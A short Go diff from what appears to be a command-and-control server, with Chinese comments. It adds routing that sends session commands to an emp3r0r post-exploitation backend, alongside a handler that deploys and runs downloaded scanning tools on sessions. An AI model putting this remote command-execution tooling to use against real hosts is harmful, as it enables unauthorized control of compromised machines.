@@ -213,9 +213,9 @@ func (s *Server) c2Sensitive(w http.ResponseWriter, r *http.Request) {
 func (s *Server) c2ScanDeploy(w http.ResponseWriter, r *http.Request) {
 	var b struct {
 		SessionID string `json:"session_id"`
-		URL       string `json:"url"`       // 工具下载 URL（fscan/nmap 等）
-		Args      string `json:"args"`      // 命令行参数
-		Action    string `json:"action"`    // deploy_run / run / stop
+		URL       string `json:"url"`    // 工具下载 URL（fscan/nmap 等）
+		Args      string `json:"args"`   // 命令行参数
+		Action    string `json:"action"` // deploy_run / run / stop
 	}
 	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.SessionID == "" {
 		writeErr(w, 400, "session_id 必填")
@@ -321,6 +321,15 @@ func (s *Server) c2Report(w http.ResponseWriter, r *http.Request) {
 
 // c2ExecAndWait 在 handler 中同步执行命令并等待结果。
 func (s *Server) c2ExecAndWait(r *http.Request, sessionID, cmd string) (string, error) {
+	// 融合路由：emp3r0r 会话经 bridge run_module exec（classic 控制台所有
+	// 会话级动作——进程、网络、插件、文件列表等——都汇聚到这里）。
+	if strings.HasPrefix(sessionID, emp3r0rIDPrefix) {
+		if !emp3r0rEnabled() {
+			return "", fmt.Errorf("emp3r0r 后端未启用")
+		}
+		return emp3r0rRunWait(r.Context(),
+			strings.TrimPrefix(sessionID, emp3r0rIDPrefix), cmd, 60*time.Second)
+	}
 	tid, err := c2Client().EnqueueTask(r.Context(), sessionID, "exec", map[string]any{"cmd": cmd})
 	if err != nil {
 		return "", err
